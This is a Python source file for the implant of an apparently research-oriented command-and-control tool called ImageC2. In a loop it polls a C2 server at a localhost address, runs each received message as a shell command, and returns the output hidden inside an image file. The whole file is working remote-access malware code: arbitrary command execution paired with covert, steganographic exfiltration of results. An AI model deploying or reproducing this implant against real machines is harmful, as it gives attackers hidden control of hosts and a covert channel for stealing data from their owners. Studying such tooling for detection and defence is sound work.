import signal
import subprocess
from time import sleep
from imagec2_common import ImageC2_Common
from pathlib import Path

DEBUG_LEVEL = 0

def signal_handler(sig, frame):
    print('Ctrl+C caught. Clean up and exit...')
    exit(0)


def init():
    # Register the signal handler
    signal.signal(signal.SIGINT, signal_handler)


def start(download_file_path:str, ic2:ImageC2_Common, sleep_time:int=5)->None:
    print("Starting the implant...\nCtrl+C to exit.")
    while True:
        # Check for a command from the C2 server:
        new_messages = []
        while [] == new_messages:
            new_messages = ic2.get_new_messages()
            sleep(sleep_time)
        # Run the command:
        for message in new_messages:
            print(f"Running command from the C2 server: {message}")
            if 1 == DEBUG_LEVEL:
                print(f"Running command: {message}")
            result = subprocess.run(message, shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                result = result.stdout
            else:
                result = result.stderr
        # Send the result back:
        if result == "" or None == result:
            result = "No output."
        if 1 == DEBUG_LEVEL:
            print(f"Saving to {download_file_path} the following result:\n{result}")
        ic2.send_hidden_command(result, download_file_path)


if __name__ == '__main__':
    image_folder_path = Path(r"G:\repos\ImageC2\endpoint_target\images")
    image_file_name = "response.png"
    command_image_file_path = image_folder_path / image_file_name
    imagec2_url = "http://127.0.0.1:5000"
    
    ic2 = ImageC2_Common(imagec2_url, image_folder_path, base_file_name="response")
    init()
    start(command_image_file_path , ic2, sleep_time=5)
    
    

